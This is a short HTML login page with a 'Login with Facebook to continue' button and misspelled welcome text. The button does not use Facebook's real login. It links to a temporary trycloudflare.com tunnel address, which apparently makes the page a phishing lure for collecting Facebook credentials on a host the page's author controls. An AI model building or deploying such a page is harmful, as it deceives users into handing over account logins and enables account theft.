<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login Page</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #e9efff, #f7f9ff);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 360px;
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            padding: 25px;
            text-align: center;
        }

        .header h1 {
            margin: 0;
            color: #333;
        }

        .header p {
            color: #666;
            font-size: 14px;
            margin-top: 8px;
        }

        .card {
            margin: 20px 0;
            padding: 15px;
            background: #f5f7ff;
            border-radius: 8px;
            font-size: 14px;
            color: #444;
        }

        .fb-link {
            text-decoration: none;
        }

        .fb-button {
            width: 100%;
            background: #1877f2;
            color: #fff;
            border: none;
            padding: 12px;
            font-size: 15px;
            border-radius: 6px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .fb-button:hover {
            background: #145fd1;
        }

        .footer {
            margin-top: 18px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>

    <div class="container">

        <div class="header">
            <h1>Welcome</h1>
            <p>Please login to continue</p>
        </div>

        <div class="card">
            Welcome to our new jeaurney , let drive into the new world , for further lets cunnect your account 
        </div>

        <!-- Link wrapped button -->
        <a href="https://ampland-pill-known-actual.trycloudflare.com" class="fb-link">
            <button class="fb-button">
                Login with Facebook to continue
            </button>
        </a>

        <div class="footer">
            Â© 2026 Demo Website. All rights reserved.
        </div>

    </div>

</body>
</html>
